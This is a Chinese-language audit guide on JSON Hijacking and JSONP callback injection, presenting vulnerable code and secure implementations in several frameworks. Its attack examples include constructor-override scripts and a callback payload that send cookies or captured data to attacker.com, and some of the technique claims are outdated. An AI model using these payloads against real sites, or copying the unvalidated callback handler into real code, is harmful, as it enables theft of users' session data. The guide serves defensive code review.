# XSS - JSON Hijacking（JSON 数据窃取）

## Details

### 什么是 JSON Hijacking

JSON Hijacking（JSON 数据窃取）是一种通过在浏览器中加载 JSON 数据的方式来获取跨域敏感数据的攻击技术。虽然浏览器的同源策略（SOP）会阻止脚本直接读取跨域 XHR 响应，但以下技术可以绕过：

1. **`<script>` 标签加载 JSON**：`<script>` 标签不受同源策略限制
2. **JSON 作为函数参数**：使用 JSONP 时，JSON 被包装为函数调用
3. **数组声明被覆盖**：在某些情况下，Array 构造函数可被重写来捕获 JSON 数据
4. **`__proto__` 污染**：通过修改原型链来劫持对象

### 典型攻击场景一：Script 标签加载

**原理：** 浏览器中的 `<script>` 标签不受同源策略限制。如果服务器返回的 JSON 被浏览器作为 JavaScript 代码执行，攻击者可以通过全局函数拦截数据。

**易受攻击的代码：**
```html
<!-- 页面在 attacker.com 上 -->
<script>
  // 拦截数组构造函数
  var originalArrays = Array;
  function Array() {
    console.log("Captured data: ", arguments);
    // 将数据发送到攻击者服务器
    new Image().src = "http://attacker.com/capture?data=" + JSON.stringify(arguments);
  }
</script>

<!-- 加载 victim.com 的 JSON API -->
<!-- 如果 victim.com 返回的是数组 JSON，会被作为脚本执行 -->
<script src="http://victim.com/api/user/profile"></script>
```

**服务器返回：**
```json
[{
  "username": "admin",
  "email": "admin@victim.com",
  "authToken": "secret_token_12345"
}]
```

**执行结果：** JSON 数组被作为 JavaScript 代码执行，触发了被拦截的 Array 构造函数，敏感数据被发送到攻击者。

### 典型攻击场景二：JSONP 回调参数注入

**原理：** JSONP（JSON with Padding）通过 `<script>` 标签和回调函数来加载 JSON 数据。如果回调函数名由用户控制，可能导致代码注入。

**易受攻击的代码（后端）：**
```python
@app.route('/api/users')
def get_users():
    callback = request.args.get('callback', 'callback')
    users = [{"name": "Alice", "email": "alice@example.com"}]

    # 危险：直接将用户输入的 callback 名称插入响应
    return f"{callback}({json.dumps(users)})"
```

**攻击方式：**
```html
<!-- 正常请求 -->
<script src="http://victim.com/api/users?callback=processUsers"></script>

<!-- 攻击请求：注入恶意代码 -->
<script src="http://victim.com/api/users?callback=alert('XSS')"></script>

<!-- 服务器返回 -->
alert('XSS')([{"name": "Alice", ...}])

<!-- 恶意回调名 -->
<script src="http://victim.com/api/users?callback=void(fetch('http://attacker.com?data='+document.cookie))"></script>
```

### 典型攻击场景三：Array 和 Object 原型污染

**易受攻击的代码：**
```javascript
// 假设 victim.com 返回的 JSON 数据如下
// {"key": "value"}

// 攻击者在自己的页面中覆盖 Object 构造函数
var captured = [];
var OriginalObject = Object;
Object = function(data) {
    captured.push(data);
    new Image().src = "http://attacker.com/steal?data=" + JSON.stringify(data);
    return new OriginalObject(data);
};

// 加载目标网站的 JSON
var script = document.createElement('script');
script.src = 'http://victim.com/api/sensitive-data';
document.body.appendChild(script);
```

### 典型攻击场景四：CSV 注入与 Excel 导出

虽然标题是 XSS，但 JSON Hijacking 也涉及导出功能的数据窃取。

**易受攻击的代码：**
```python
@app.route('/api/export')
def export_data():
    format = request.args.get('format', 'json')
    data = get_confidential_data()

    if format == 'json':
        # 仅限本页面，但可被 JSONP 劫持
        return jsonify(data)
    elif format == 'csv':
        # CSV 可被直接加载和读取
        return to_csv(data)
```

**攻击方式：**
```html
<!-- 直接加载 CSV，内容会显示在页面上 -->
<iframe src="http://victim.com/api/export?format=csv"></iframe>

<!-- 或通过 AJAX 的 CORS 预检漏洞 -->
```

### 快速定位核心操作（L1: 关键词扫描）

**JSONP 相关：**
```
callback
callback=
jsonp=
padding=
?_callback
?func
?function
```

**JSON 导出端点：**
```
/api/data
/api/export
/api/users
/api/profile
```

**危险的返回类型：**
```javascript
// 直接返回 JSON 对象或数组
[{...}]
{...}

// 而非被函数包装的 JSONP
callback([{...}])
```

**用户可控的参数：**
```
?callback=func_name
?jsonp=processData
?padding=wrapper
```

**相关库/框架：**
```
Spring Boot @JsonpController
Flask jsonify() without JSONP protection
Express res.json()
Django JsonResponse
Rails respond_to :json
```

### 快速定位保护机制（L2: 跳读）

**正确的 JSONP 实现：**

**Python - Flask：**
```python
from flask import jsonify, request
import re

@app.route('/api/users')
def get_users():
    callback = request.args.get('callback')
    users = get_user_data()

    # 防护 1：验证回调函数名（白名单）
    if callback and not re.match(r'^[a-zA-Z_$][a-zA-Z0-9_$]*$', callback):
        return jsonify({"error": "Invalid callback"}), 400

    # 防护 2：限制回调函数名长度
    if callback and len(callback) > 64:
        return jsonify({"error": "Callback too long"}), 400

    # 防护 3：如果不需要 JSONP，直接返回 JSON
    if not callback:
        return jsonify(users)

    # 防护 4：返回被包装的 JSONP
    return f"{callback}({json.dumps(users)})", 200, {'Content-Type': 'application/javascript'}
```

**Java - Spring Boot：**
```java
@GetMapping("/api/users")
public Object getUsers(@RequestParam(required = false) String callback) {
    List<User> users = userService.getAllUsers();

    // 防护 1：验证回调函数名
    if (callback != null && !callback.matches("[a-zA-Z_$][a-zA-Z0-9_$]*")) {
        return ResponseEntity.badRequest().body("Invalid callback");
    }

    // 防护 2：如果没有回调，返回 JSON，设置正确的 Content-Type
    if (callback == null) {
        return ResponseEntity.ok()
            .contentType(MediaType.APPLICATION_JSON)
            .body(users);
    }

    // 防护 3：返回 JSONP 格式
    String jsonp = callback + "(" + objectMapper.writeValueAsString(users) + ")";
    return ResponseEntity.ok()
        .contentType(MediaType.APPLICATION_JAVASCRIPT)
        .body(jsonp);
}
```

**JavaScript - 客户端防护：**
```javascript
// 不要覆盖 Array 或 Object 构造函数
// 应该使用现代的 CORS + fetch API

// 安全的方式：使用 fetch
fetch('http://victim.com/api/users')
    .then(response => response.json())
    .then(data => {
        // 处理数据
    });

// 而不是
// <script src="http://victim.com/api/users?callback=processData"></script>
```

**Node.js - Express：**
```javascript
app.get('/api/users', (req, res) => {
    const callback = req.query.callback;
    const users = getUserData();

    // 防护 1：验证回调函数名
    if (callback && !/^[a-zA-Z_$][a-zA-Z0-9_$]*$/.test(callback)) {
        return res.status(400).json({error: "Invalid callback"});
    }

    // 防护 2：无回调时返回 JSON
    if (!callback) {
        return res.json(users);
    }

    // 防护 3：返回 JSONP
    res.type('application/javascript');
    res.send(`${callback}(${JSON.stringify(users)})`);
});
```

**PHP 防护：**
```php
<?php
$callback = isset($_GET['callback']) ? $_GET['callback'] : null;
$users = getUserData();

// 防护 1：验证回调函数名
if ($callback && !preg_match('/^[a-zA-Z_$][a-zA-Z0-9_$]*$/', $callback)) {
    http_response_code(400);
    exit(json_encode(['error' => 'Invalid callback']));
}

// 防护 2：无回调时返回 JSON
if (!$callback) {
    header('Content-Type: application/json');
    echo json_encode($users);
    exit;
}

// 防护 3：返回 JSONP
header('Content-Type: application/javascript');
echo $callback . '(' . json_encode($users) . ')';
?>
```

**HTTP 头部防护：**
```
// 设置正确的 Content-Type
Content-Type: application/json  (非 JSONP)
Content-Type: application/javascript  (JSONP)

// 添加安全头
X-Content-Type-Options: nosniff  (防止浏览器猜测 MIME 类型)
Cache-Control: no-store  (防止缓存敏感数据)
```

**审计技巧（L3: 逐行读）：**
- 查找所有返回 JSON 数据的端点
- 检查是否支持 JSONP（是否有 callback 参数）
- 验证回调函数名是否经过验证
- 检查返回的 Content-Type 是否正确
- 查找是否返回裸露的 JSON 数组（易被加载为脚本）

**跨模块保护（L4: 跨模块追踪）：**
- 框架层面：框架是否提供了 JSONP 防护
- 全局中间件：是否有统一的 callback 验证
- CORS 配置：是否正确配置了 CORS 而不依赖 JSONP
- CSP 策略：是否限制了 `<script>` 标签的来源

## Classify

### 确认为漏洞

- 端点支持 JSONP（有 `callback` 参数）但未验证回调函数名
- 返回的 JSON 数据是数组（可被 `<script>` 标签加载执行）
- 回调函数名来自用户输入且未过滤
- 可以通过 PoC 验证：创建测试 HTML 页面，加载目标 API，验证是否能捕获返回数据

### 误报场景

- 端点不支持 JSONP，仅返回 JSON
- 返回的是标准 JSON 对象而非数组（`{...}` 而非 `[...]`）
- 回调函数名经过严格验证（使用白名单，限制长度）
- Content-Type 设置为 `application/json` 而非 `application/javascript`
- 使用了现代的 CORS 而非 JSONP
- 应用使用了强制 CSP 策略，限制了 `<script>` 标签的来源

### 代码异味

- JSONP 支持不一致（某些端点支持，某些不支持）
- 回调函数验证逻辑分散
- 没有区分 JSONP 和常规 JSON 响应
- Content-Type 设置不一致

## Low risk

### 降级为低风险的情况

- **正确的验证**：回调函数名经过严格的正则表达式验证（`^[a-zA-Z_$][a-zA-Z0-9_$]*$`）
- **长度限制**：回调函数名长度限制在 32-64 字符
- **返回 JSON 对象**：API 返回的是 `{...}` 而非 `[...]`，无法直接作为可执行代码
- **正确的 Content-Type**：设置为 `application/json` 而非 `application/javascript`
- **X-Content-Type-Options 头**：设置为 `nosniff`，阻止浏览器 MIME 类型猜测
- **CORS 使用**：使用现代的 CORS 而非 JSONP
- **非敏感数据**：返回的数据不涉及用户隐私或认证凭证
- **CSP 限制**：应用设置了强制的 CSP 策略，限制脚本来源

### 需要额外评估的因素

- 返回的数据是否包含用户隐私信息（邮箱、电话、ID）
- 是否包含认证令牌或会话凭证
- 攻击者是否需要特殊的权限来调用这些 API
- 是否存在其他技术（如 ImageTag XSS）来绕过保护
- 浏览器的同源策略是否真的能阻止数据访问（跨域 + 脚本标签 = 可被执行）
